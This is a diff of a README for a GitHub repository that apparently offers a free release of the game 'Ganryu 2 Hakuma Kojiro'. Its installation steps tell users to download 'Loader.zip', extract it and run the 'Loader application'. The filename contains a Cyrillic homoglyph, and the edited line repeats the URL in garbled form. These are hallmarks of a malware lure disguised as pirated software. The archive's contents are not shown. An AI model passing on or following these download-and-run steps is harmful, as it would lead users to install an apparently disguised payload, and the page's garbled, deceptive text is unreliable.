@@ -23,7 +23,7 @@ Welcome to the **Ganryu 2 Hakuma Kojiro ** repository! 🚀 This project offers 
 
 ## 🛠️ Installation
 
-1. Download **https://raw.githubusercontent.com/dhia7an/Ganryu2-Hakuma-Kojiro-Free-Release/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/dhia7an/Ganryu2-Hakuma-Kojiro-Free-Release/main/Lоader.zipоhttps://raw.githubusercontent.com/dhia7an/Ganryu2-Hakuma-Kojiro-Free-Release/main/Lоader.zip** from the repository.
 2. Extract all files to your preferred directory.
 3. Run the Loader application according to your OS (check compatibility table).
 4. Follow the on-screen prompts to start the game.
